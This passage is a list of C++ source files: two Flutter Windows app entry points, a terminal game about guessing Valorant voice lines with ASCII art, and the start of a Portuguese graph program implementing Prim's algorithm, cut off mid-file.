    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"namer_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"objectDetectionApp\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <ctime>\n#include <unistd.h>\n#include <cctype>\n\nusing namespace std;\n\nstring CLS = \"\\033[2J\\033[1;1H\"; //clear screen\nstring Default = \"\\033[0m\"; // default gray & reset background\nstring White = \"\\033[37;1m\"; // bright white\nstring Red = \"\\033[31;1m\";\nstring Pink = \"\\x1B[38;5;213m\";\nstring Green = \"\\033[32;1m\";\nstring SeaGreen = \"\\x1B[38;5;158m\";\nstring Yellow = \"\\033[33;1m\";\nstring Navy = \"\\033[34;1m\";\nstring Blue = \"\\x1B[38;5;117m\";\nstring Cyan = \"\\033[36;1m\";\nstring Purple = \"\\x1B[38;5;171m\";\nstring Orange = \"\\x1B[38;5;208m\";\nstring Coral = \"\\x1B[38;5;204m\";\n\nvoid attemts(int badGuesses, string secretPhrase){\n  if (badGuesses == 0){\n    cout << CLS;\n    string asciibad = R\"(\n\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u287f\u283f\u283f\u283f\u283f\u283f\u28bf\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\n\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u281f\u28eb\u28f5\u28f6\u28ff\u28ff\u28ff\u28ff\u28ff\u28f7\u28f6\u28ec\u28dd\u283b\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\n\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u280f\u28fc\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28f7\u28e4\u2819\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\n\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28b8\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28f7\u2848\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\n\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u280f\u2880\u28ff\u28ff\u2806\u288b\u28e5\u28e4\u28f6\u28e6\u28e4\u28cd\u2859\u283b\u28bf\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28e7\u28b8\u28ff\u28ff\u28ff\u28ff\u28ff\n\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u287f\u283f\u28ff\u2800\u2898\u28eb\u28e5\u28f4\u28f6\u28f6\u28f6\u28f6\u28e6\u28ec\u28cd\u28c9\u285b\u2826\u2808\u283b\u28ff\u28ff\u28ff\u28ff\u2847\u283c\u289b\u280b\u28f8\u28ff\u28ff\n\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u283f\u28db\u28e0\u28f4\u28fe\u28ff\u28ff\u28ff\u28db\u283f\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28f7\u28e6\u28c4\u2819\u28bf\u28ff\u281f\u28f0\u28fe\u280b\u2834\u28bb\u28ff\u28ff\n\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u281f\u28e9\u28f6\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28fe\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28e6\u2840\u283a\u283f\u281f\u28c2\u28f4\u28ff\u28ff\u28ff\n\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u281f\u28f5\u28ff\u283f\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28e6\u2858\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\n\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u287f\u28a1\u28fe\u281f\u28a1\u28fe\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u287f\u289b\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u287f\u28ff\u28ff\u28ff\u28ff\u28ff\u28f7\u2858\u28ff\u28ff\u28ff\u28ff\u28ff\n\u28ff\u28ff\u287f\u283f\u28ff\u28ff\u28ff\u28ff\u287f\u28b1\u287f\u2861\u28b0\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u287f\u280f\u28f0\u28ff\u28ff\u281f\u28bb\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28cc\u283b\u28ff\u28ff\u28ff\u28ff\u28e7\u28b9\u28ff\u28ff\u28ff\u28ff\n\u28ff\u28ff\u28ff\u28f6\u28e4\u2819\u28bf\u28ff\u2883\u287f\u28f0\u28a3\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u287f\u289f\u28e1\u28f6\u28a0\u28ff\u288f\u28f4\u28fe\u2846\u28bf\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28c6\u281c\u28ff\u28ff\u28ff\u28ff\u2840\u28ff\u28ff\u28ff\u28ff\n\u28ff\u28ff\u28ff\u287f\u28bf\u2847\u280c\u28ff\u28b8\u2847\u284f\u28fc\u28ff\u28ff\u28ff\u28ff\u287f\u288b\u28f4\u28ff\u28ff\u284f\u2878\u28a1\u28fe\u283f\u289f\u28db\u2858\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u287c\u28fc\u28ff\u28ff\u28ff\u2847\u28bb\u28ff\u28ff\u28ff\n\u28ff\u28ff\u283f\u2801\u2800\u2880\u28f4\u28ff\u28b8\u2847\u2847\u28ff\u28ff\u28ff\u28ff\u281f\u28e0\u28f6\u28cc\u28f9\u28ff\u2847\u28a1\u28ff\u28f7\u28fe\u287f\u28bf\u28f7\u2858\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28e7\u28b8\u28ff\u28ff\u28ff\u2847\u28fe\u28ff\u28ff\u28ff\n\u287f\u28a1\u2806\u280b\u2800\u2818\u28ff\u28ff\u28c6\u2801\u2847\u28bb\u28ff\u28cf\u2801\u2888\u2809\u2819\u28bf\u28ff\u28ff\u28e7\u28fc\u28cd\u2819\u2801\u2800\u2800\u2800\u2801\u2818\u28bf\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u2818\u28ff\u28ff\u28ff\u2800\u28ff\u28ff\u28ff\u28ff\n\u28a1\u28ff\u2820\u2800\u2800\u2800\u283f\u28bf\u28ff\u28e6\u2858\u2818\u28ff\u28e7\u2840\u28e7\u28c0\u2810\u2800\u28ff\u28ff\u28ff\u28ff\u28ff\u28a3\u28e7\u28c0\u2848\u2808\u28a0\u2840\u28c4\u283b\u28ff\u28ff\u28ff\u28ff\u28ff\u2888\u28db\u285b\u280f\u28fc\u28ff\u28ff\u28ff\u28ff\n\u28c4\u2839\u28f7\u2846\u2800\u2810\u283f\u28f7\u28ce\u28bb\u28ff\u28c6\u28b9\u28ff\u2847\u28ff\u2849\u2800\u2800\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u281b\u281b\u2800\u2800\u2800\u28ff\u2847\u28cc\u28fb\u28ff\u28ff\u2847\u287c\u288b\u28c9\u2844\u28ff\u28ff\u28ff\u28ff\u28ff\n\u28ff\u28f7\u28f6\u28c4\u2800\u2800\u28ff\u2846\u287f\u28f8\u28ff\u28ff\u2806\u28bb\u28b8\u28e7\u28c1\u28f6\u28fe\u28cf\u28f9\u28ff\u28ff\u28ff\u28ff\u28dc\u2837\u28e4\u2840\u2800\u28b8\u28ff\u2807\u28ff\u28ff\u28ff\u287f\u2801\u28e0\u28fd\u28ff\u28a1\u28ff\u28ff\u28ff\u28ff\u28ff\n\u28ff\u287f\u283f\u28bf\u28e6\u28f4\u281f\u2881\u28f4\u28ff\u28ff\u28ff\u28f7\u28e6\u2808\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28f7\u28fe\u28ff\u285f\u28f8\u28ff\u28ff\u285f\u28c1\u28f0\u28ff\u287f\u2881\u28fe\u28ff\u28ff\u28ff\u28ff\u28ff\n\u285f\u2840\u2800\u2804\u28ff\u28c7\u28f4\u28ff\u28ff\u28ff\u28ff\u28ff\u2847\u28bf\u28e7\u2858\u28bf\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28a1\u28ff\u28ff\u280f\u2800\u2819\u281b\u28e9\u28f4\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\n\u2807\u2807\u2860\u2800\u28ff\u287f\u288b\u28b9\u28ff\u28ff\u28ff\u28ff\u28ff\u2858\u28ff\u28f7\u2880\u2819\u283b\u28bf\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u2883\u28fe\u281f\u2881\u28e4\u2844\u2800\u28e6\u2859\u283b\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\n\u2844\u2810\u2803\u2800\u2808\u2801\u2800\u28b8\u28ff\u28ff\u28ff\u28ff\u28ff\u28f7\u2858\u28bf\u2800\u28fc\u28ff\u28f6\u28e6\u2848\u2809\u28c9\u28c9\u2809\u2809\u2809\u2865\u2820\u281e\u2801\u2800\u2808\u2809\u2801\u28a0\u28ff\u28ff\u2806\u2839\u283f\u283f\u283f\u28bf\u28ff\u28ff\n\u28f7\u2840\u2800\u2800\u2800\u2800\u2800\u2819\u28bf\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u2806\u2800\u28bf\u28ff\u28ff\u28ff\u28e7\u2818\u28bb\u28ff\u28c7\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2880\u2834\u283f\u281b\u2801\u2880\u28f4\u2876\u2880\u2800\u28f8\u28ff\u28ff\n\u28ff\u28ff\u28e6\u28c0\u2800\u2800\u2800\u2800\u28e4\u28d9\u283b\u28bf\u28ff\u287f\u2883\u28fc\u2847\u28e6\u28fd\u28ff\u281f\u2881\u28f4\u28c4\u2818\u28a0\u28e4\u28e4\u2840\u2800\u2800\u2800\u2800\u28c0\u28e0\u2840\u28f6\u28ca\u28f4\u28ff\u285f\u28e0\u28ff\u28f7\u284c\u28bf\u28ff\n\u28ff\u28ff\u28ff\u28ff\u28f7\u28e4\u2840\u283e\u28ff\u28ff\u28ff\u28f6\u28cc\u2832\u28ff\u28ff\u28c7\u2839\u283f\u2801\u28f0\u28ff\u28ff\u28ff\u28f7\u28c4\u2809\u283f\u28bf\u28e6\u2804\u2818\u283f\u28ff\u28ff\u2847\u2819\u28b9\u28ff\u281f\u28f0\u28ff\u28ff\u28ff\u28ff\u28c6\u28bb\n    )\";\n    cout << White << asciibad << endl << Default;\n    cout << Orange << \"\\nYour task is to guess the voice line of the characters in valorant\\n\" << Default;\n  }else if (badGuesses == 1){\n    string asciibad = R\"(\u2800\u2800\u2820\u2824\u28c0\u2800\u2824\u2840\u2800\u2800\u2800\u2800\u2800\u2800\u2880\u2864\u2840\u28c0\u2840\u2800\u2800\u2800\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2809\u2886\u2808\u28a2\u2800\u2800\u2800\u2800\u2800\u2800\u2808\u2809\u2810\u2802\u288d\u2812\u2884\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2880\u280e\u2800\u28a0\u2807\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2846\u2800\u28b1\u2800\n\u2800\u2800\u2860\u2804\u280a\u2801\u2860\u2810\u2801\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2874\u2801\u28e0\u280e\u2800\n\u28a0\u280a\u2800\u2800\u2814\u280b\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2860\u2814\u28c8\u2804\u281a\u2801\u2800\u2800\n\u28b8\u2840\u2800\u2818\u28c4\u2800\u28e0\u28f6\u28ff\u28f7\u28f6\u28ff\u2836\u28b6\u28a2\u2844\u28c5\u2800\u2803\u2804\u2840\u2800\u2800\u2800\n\u2800\u2811\u2822\u2884\u28c8\u2819\u281b\u283f\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28e5\u28c0\u2851\u2802\u2884\u2808\u2822\u2800\u2800\n\u2800\u2800\u28e0\u28fc\u28ff\u28ff\u28f7\u28e6\u28ec\u2859\u28ff\u28ff\u28ff\u283f\u28ff\u28f7\u286c\u2817\u2800\u2880\u2802\u2880\u2800\u2800\n\u2800\u28b0\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u2817\u28b8\u28ff\u287f\u283c\u28f4\u28e9\u2867\u2804\u28ca\u2861\u2810\u280b\u2800\u2800\n\u2800\u28bf\u28ff\u28ff\u28ff\u281f\u280b\u2849\u28e0\u2810\u2809\u2800\u2880\u28e4\u28ba\u28df\u28b6\u284d\u2800\u2800\u2800\u2800\u2800\u2800\n\u2880\u28ff\u28ff\u28ff\u2808\u28a2\u287c\u28af\u28ed\u28cd\u2832\u2844\u28fe\u28eb\u2838\u28ff\u2807\u28b9\u2800\u2800\u2800\u2800\u2800\u2800                      -+*******##%%@@@.    =**=     .                 \n\u28b8\u287f\u28bf\u28ff\u2844\u28be\u28f7\u2800\u281b\u281b\u2840\u2877\u2818\u28b3\u28a7\u28c0\u2866\u283f\u28e6\u2840\u2800\u2800\u2800\u2800                .-+********#%%@@@@@@@@@%#%+    *++%@@@@@@@@%*=:       \n\u2800\u28bf\u28ff\u28ff\u287f\u2818\u283f\u28e7\u28c6\u28f4\u28bf\u28e5\u2824\u2809\u281b\u288b\u28e4\u2840\u2808\u28b3\u2800\u2800\u2800\u2800              -----====%%%%%@@@@*    -%%%%      *####*%##@#*%##.      \n\u2880\u28fc\u28ff\u28ff\u2800\u2800\u2800\u2800\u2800\u28f0\u282f\u2864\u2834\u28f6\u28db\u28c9\u28c0\u28b9\u2844\u28b8\u2845\u2800\u2800\u2800                  .....:::-+**%@@@@@+*@%%%%.    :####*+***%###%#.     \n\u2808\u28b7\u28e4\u28ff\u2800\u2800\u2800\u2800\u28b0\u28ff\u2800\u28f4\u281f\u2809\u281b\u28c0\u28d9\u28a7\u2847\u28fc\u28c0\u28c0\u2840\u2800                     .::::::--=*#%%%@%*  .##++#+   -=%%%-. :.         \n\u2800\u2818\u283a\u28cf\u28e7\u28c6\u2800\u2800\u2838\u28df\u28fe\u28e3\u28f6\u28fe\u281f\u281b\u2813\u2892\u289f\u285b\u288b\u284d\u28fd\u2803                                 .:-==+#.                             \n\u2800\u2800\u2800\u2809\u2881\u28e8\u2877\u2836\u2892\u28ca\u282d\u2845\u286f\u2825\u2824\u28e4\u28d6\u2889\u2850\u2881\u288e\u287c\u2801\u2800\n\u2800\u2800\u2800\u28be\u28cb\u2825\u2810\u280a\u2809\u2800\u2800\u2847\u28f7\u28f6\u28ff\u28ff\u28ff\u28f4\u28e1\u280b\u283f\u28e5\u28c0\u2840\n\u2800\u2800\u2800\u2800\u2839\u2846\u2800\u2800\u2800\u2800\u2800\u2847\u283f\u28df\u285f\u28fb\u28ff\u2847\u2806\u2809\u2879\u2882\u287c\u2803\n\u2800\u2800\u2800\u2800\u2800\u2819\u2822\u28c4\u2840\u2800\u2800\u280b\u2809\u2800\u2847\u28ff\u28ff\u283b\u28e0\u2894\u2875\u280b\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2809\u2813\u28a6\u28c4\u2800\u2800\u2807\u28ff\u28df\u281c\u28e1\u281e\u2800\u2800\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2808\u281b\u2836\u28c4\u28ff\u28ef\u285e\u2801\u2800\u2800\u2800\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2808\u281b\u280b\u2800\u2800\u2800\u2800\u2800\u2800\u2800)\";\n    cout << Orange << asciibad << endl << Default;\n  }else if (badGuesses == 2){\n    string asciibad = R\"(\u2800\u2800\u2820\u2824\u28c0\u2800\u2824\u2840\u2800\u2800\u2800\u2800\u2800\u2800\u2880\u2864\u2840\u28c0\u2840\u2800\u2800\u2800\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2809\u2886\u2808\u28a2\u2800\u2800\u2800\u2800\u2800\u2800\u2808\u2809\u2810\u2802\u288d\u2812\u2884\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2880\u280e\u2800\u28a0\u2807\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2846\u2800\u28b1\u2800\n\u2800\u2800\u2860\u2804\u280a\u2801\u2860\u2810\u2801\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2874\u2801\u28e0\u280e\u2800\n\u28a0\u280a\u2800\u2800\u2814\u280b\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2860\u2814\u28c8\u2804\u281a\u2801\u2800\u2800\n\u28b8\u2840\u2800\u2818\u28c4\u2800\u28e0\u28f6\u28ff\u28f7\u28f6\u28ff\u2836\u28b6\u28a2\u2844\u28c5\u2800\u2803\u2804\u2840\u2800\u2800\u2800\n\u2800\u2811\u2822\u2884\u28c8\u2819\u281b\u283f\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28e5\u28c0\u2851\u2802\u2884\u2808\u2822\u2800\u2800\n\u2800\u2800\u28e0\u28fc\u28ff\u28ff\u28f7\u28e6\u28ec\u2859\u28ff\u28ff\u28ff\u283f\u28ff\u28f7\u286c\u2817\u2800\u2880\u2802\u2880\u2800\u2800\n\u2800\u28b0\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u2817\u28b8\u28ff\u287f\u283c\u28f4\u28e9\u2867\u2804\u28ca\u2861\u2810\u280b\u2800\u2800\n\u2800\u28bf\u28ff\u28ff\u28ff\u281f\u280b\u2849\u28e0\u2810\u2809\u2800\u2880\u28e4\u28ba\u28df\u28b6\u284d\u2800\u2800\u2800\u2800\u2800\u2800\n\u2880\u28ff\u28ff\u28ff\u2808\u28a2\u287c\u28af\u28ed\u28cd\u2832\u2844\u28fe\u28eb\u2838\u28ff\u2807\u28b9\u2800\u2800\u2800\u2800\u2800\u2800                    -+*******##%%@@@.    =**=     .                 \n\u28b8\u287f\u28bf\u28ff\u2844\u28be\u28f7\u2800\u281b\u281b\u2840\u2877\u2818\u28b3\u28a7\u28c0\u2866\u283f\u28e6\u2840\u2800\u2800\u2800\u2800              .-+********#%%@@@@@@@@@%#%+    *++%@@@@@@@@%*=:       \n\u2800\u28bf\u28ff\u28ff\u287f\u2818\u283f\u28e7\u28c6\u28f4\u28bf\u28e5\u2824\u2809\u281b\u288b\u28e4\u2840\u2808\u28b3\u2800\u2800\u2800\u2800            -----====%%%%%@@@@*    -%%%%      *####*%##@#*%##.      \n\u2880\u28fc\u28ff\u28ff\u2800\u2800\u2800\u2800\u2800\u28f0\u282f\u2864\u2834\u28f6\u28db\u28c9\u28c0\u28b9\u2844\u28b8\u2845\u2800\u2800\u2800                .....:::-+**%@@@@@+*@%%%%.    :####*+***%###%#.     \n\u2808\u28b7\u28e4\u28ff\u2800\u2800\u2800\u2800\u28b0\u28ff\u2800\u28f4\u281f\u2809\u281b\u28c0\u28d9\u28a7\u2847\u28fc\u28c0\u28c0\u2840                    .::::::--=*#%%%@%*  .##++#+   -=%%%-. :.         \n\u2800\u2818\u283a\u28cf\u28e7\u28c6\u2800\u2800\u2838\u28df\u28fe\u28e3\u28f6\u28fe\u281f\u281b\u2813\u2892\u289f\u285b\u288b\u284d\u28fd\u2803                               .:-==+#.                             \n\u2800\u2800\u2800\u2809\u2881\u28e8\u2877\u2836\u2892\u28ca\u282d\u2845\u286f\u2825\u2824\u28e4\u28d6\u2889\u2850\u2881\u288e\u287c\u2801\u2800\n\u2800\u2800\u2800\u28be\u28cb\u2825\u2810\u280a\u2809\u2800\u2800\u2847\u28f7\u28f6\u28ff\u28ff\u28ff\u28f4\u28e1\u280b\u283f\u28e5\u28c0\u2840\n\u2800\u2800\u2800\u2800\u2839\u2846\u2800\u2800\u2800\u2800\u2800\u2847\u283f\u28df\u285f\u28fb\u28ff\u2847\u2806\u2809\u2879\u2882\u287c\u2803\n\u2800\u2800\u2800\u2800\u2800\u2819\u2822\u28c4\u2840\u2800\u2800\u280b\u2809\u2800\u2847\u28ff\u28ff\u283b\u28e0\u2894\u2875\u280b\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2809\u2813\u28a6\u28c4\u2800\u2800\u2807\u28ff\u28df\u281c\u28e1\u281e\u2800\u2800\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2808\u281b\u2836\u28c4\u28ff\u28ef\u285e\u2801\u2800\u2800\u2800\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2808\u281b\u280b\u2800\u2800\u2800\u2800\u2800\u2800\u2800)\";\n   cout << Orange << asciibad << endl << Default;\n  }else if (badGuesses == 3){\n    string asciibad = R\"(\u2800\u2800\u2820\u2824\u28c0\u2800\u2824\u2840\u2800\u2800\u2800\u2800\u2800\u2800\u2880\u2864\u2840\u28c0\u2840\u2800\u2800\u2800\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2809\u2886\u2808\u28a2\u2800\u2800\u2800\u2800\u2800\u2800\u2808\u2809\u2810\u2802\u288d\u2812\u2884\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2880\u280e\u2800\u28a0\u2807\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2846\u2800\u28b1\u2800\n\u2800\u2800\u2860\u2804\u280a\u2801\u2860\u2810\u2801\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2874\u2801\u28e0\u280e\u2800\n\u28a0\u280a\u2800\u2800\u2814\u280b\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2860\u2814\u28c8\u2804\u281a\u2801\u2800\u2800\n\u28b8\u2840\u2800\u2818\u28c4\u2800\u28e0\u28f6\u28ff\u28f7\u28f6\u28ff\u2836\u28b6\u28a2\u2844\u28c5\u2800\u2803\u2804\u2840\u2800\u2800\u2800\n\u2800\u2811\u2822\u2884\u28c8\u2819\u281b\u283f\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28e5\u28c0\u2851\u2802\u2884\u2808\u2822\u2800\u2800\n\u2800\u2800\u28e0\u28fc\u28ff\u28ff\u28f7\u28e6\u28ec\u2859\u28ff\u28ff\u28ff\u283f\u28ff\u28f7\u286c\u2817\u2800\u2880\u2802\u2880\u2800\u2800\n\u2800\u28b0\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u2817\u28b8\u28ff\u287f\u283c\u28f4\u28e9\u2867\u2804\u28ca\u2861\u2810\u280b\u2800\u2800\n\u2800\u28bf\u28ff\u28ff\u28ff\u281f\u280b\u2849\u28e0\u2810\u2809\u2800\u2880\u28e4\u28ba\u28df\u28b6\u284d\u2800\u2800\u2800\u2800\u2800\u2800\n\u2880\u28ff\u28ff\u28ff\u2808\u28a2\u287c\u28af\u28ed\u28cd\u2832\u2844\u28fe\u28eb\u2838\u28ff\u2807\u28b9\u2800\u2800\u2800\u2800\u2800\u2800                  -+*******##%%@@@.    =**=     .                 \n\u28b8\u287f\u28bf\u28ff\u2844\u28be\u28f7\u2800\u281b\u281b\u2840\u2877\u2818\u28b3\u28a7\u28c0\u2866\u283f\u28e6\u2840\u2800\u2800\u2800\u2800            .-+********#%%@@@@@@@@@%#%+    *++%@@@@@@@@%*=:       \n\u2800\u28bf\u28ff\u28ff\u287f\u2818\u283f\u28e7\u28c6\u28f4\u28bf\u28e5\u2824\u2809\u281b\u288b\u28e4\u2840\u2808\u28b3\u2800\u2800\u2800\u2800          -----====%%%%%@@@@*    -%%%%      *####*%##@#*%##.      \n\u2880\u28fc\u28ff\u28ff\u2800\u2800\u2800\u2800\u2800\u28f0\u282f\u2864\u2834\u28f6\u28db\u28c9\u28c0\u28b9\u2844\u28b8\u2845\u2800\u2800\u2800              .....:::-+**%@@@@@+*@%%%%.    :####*+***%###%#.     \n\u2808\u28b7\u28e4\u28ff\u2800\u2800\u2800\u2800\u28b0\u28ff\u2800\u28f4\u281f\u2809\u281b\u28c0\u28d9\u28a7\u2847\u28fc\u28c0\u28c0\u2840\u2800                 .::::::--=*#%%",
    "#include <climits>\n#include <clocale>\n#include <cstring>\n#include <fstream>\n#include <iostream>\n#include <queue>\n#include <vector>\n\n/* Mensagens*/\n\nconst char TEXTO_AJUDA[] =\n  \"-h           : mostra o help\\n\"\n  \"-o <arquivo> : redireciona a saida para o \u201carquivo\u201d\\n\"\n  \"-f <arquivo> : indica o \u201carquivo\u201d que cont\u00e9m o grafo de entrada\\n\"\n  \"-s           : mostra a solu\u00e7\u00e3o\\n\"\n  \"-i           : v\u00e9rtice inicial (para o algoritmo de Prim)\\n\";\n\nconst char TEXTO_ERRO[] = \"Par\u00e2metro desconhecido (use -h para ver os dispon\u00edveis)\";\n\n/* Tipos */\ntypedef std::pair<int, unsigned> ParInteiros;\ntypedef std::vector<std::vector<ParInteiros>> Grafo;\n\ntypedef struct Dados {\n  std::vector<int> prev;\n  std::vector<int> custo;\n} Dados;\n\n/* Fun\u00e7\u00f5es */\n\nGrafo ler_grafo(std::istream *in) {\n  unsigned qtd_vertices, qtd_arestas, u, v, i;\n  int w;\n\n  *in >> qtd_vertices >> qtd_arestas;\n  Grafo 